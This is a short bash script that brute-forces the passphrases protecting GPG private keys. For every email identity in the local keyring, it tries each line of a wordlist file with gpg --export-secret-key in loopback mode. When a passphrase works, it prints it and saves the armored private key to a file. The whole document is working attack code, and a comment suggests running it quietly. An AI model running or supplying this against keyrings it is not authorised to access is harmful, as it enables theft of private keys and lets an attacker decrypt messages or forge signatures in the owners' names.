#!/bin/bash
# find passphrase for private key of multiple user

MAILS=$(gpg -k | grep uid | grep -oE '<[^>]+>' | tr -d '<>')
for mail in ${MAILS}; do 
    if ! gpg --list-keys | grep uid | grep -q "${mail}"; then
        echo "Could not identify keys for ${mail}."
        exit 1
    fi

    while read -r passphrase; do
        echo "Bruteforcing for ${mail} with ${passphrase}..."
        if echo "${passphrase}" | gpg --batch \
                                    --yes \
                                    --pinentry-mode loopback \
                                    --passphrase-fd 0 \
                                    --output private_${mail}.pgp \
                                    --armor \
                                    --export-secret-key "${mail}"; then 
            # --batch non interactive mode
            # --yes to all questions
            # --pinentry-mode uses stdin for passphrase entry
            # --passphrase-fd reads from stdin
            echo "Passphrase is : ${passphrase}"
            echo "Private key now located at private_"${mail}".pgp"
            break 
        fi
    done < passphrase.txt # find a passphrase.txt to test, and run quietly with ./script 2>&1 
done